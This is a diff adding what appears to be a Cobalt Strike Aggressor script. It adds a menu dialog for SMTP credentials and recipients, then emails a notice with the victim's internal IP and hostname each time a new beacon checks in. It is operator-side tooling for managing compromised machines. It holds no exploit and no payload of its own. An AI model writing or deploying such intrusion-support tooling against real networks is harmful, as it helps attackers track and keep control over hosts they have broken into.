@@ -1,0 +1,60 @@
+import email.content.Main from: Aggressor_mail.jar;
+local('$smtp $myEmailAccount $myEmailPassword $Sender @Recipients');
+
+sub stage_attack{
+
+ %options = $3;
+$smtp = %options['smtp'];
+$myEmailAccount = %options['myEmailAccount'];
+$myEmailPassword = %options['myEmailPassword'];
+$Sender = %options['Sender'];
+@Recipients = split(',',%options['Recipients']);
+ }
+
+
+on beacon_initial {
+
+	show_message($myEmailPassword);
+	
+foreach $entry (beacons()) {
+ 
+    			   if($entry['id'] == $1){
+$value = [new Main];
+[$value setValue : $myEmailAccount,$myEmailPassword,$smtp,@Recipients,$entry['computer'] ,$Sender,"Target ip:" . $entry['internal'] . "Target host: " . $entry['computer']];
+[$value  start];
+println(@Recipients);
+      }
+   }
+}
+
+popup attacks {
+local('$dialog %defaults');
+  item "set email"{
+    # setup our defaults
+    %defaults["smtp"] = "smtp.163.com";
+    %defaults["myEmailAccount"]  = "xxx@163.com";
+    %defaults["myEmailPassword"] = "*******";
+    %defaults["Sender"] = "Sender";
+    %defaults["Recipients"] = "xxx@gmail.com";
+$dialog = dialog("email online reminder", %defaults, &stage_attack);
+dialog_description($dialog, "This is a cobalt strike on-line automatically remind the plug-in if there are multiple recipients please use, separated.");
+drow_text($dialog, "smtp", "smtp: ");
+drow_text($dialog, "myEmailAccount", "Outbox: ");
+drow_text($dialog, "myEmailPassword", "Password: ");
+drow_text($dialog, "Sender", "Sender: ");
+drow_text($dialog, "Recipients", "Recipients: ");
+dbutton_action($dialog, "Launch");
+
+		# show our dialog
+		dialog_show($dialog);
+  }
+}
+
+
+
+
+
+
+
+
+
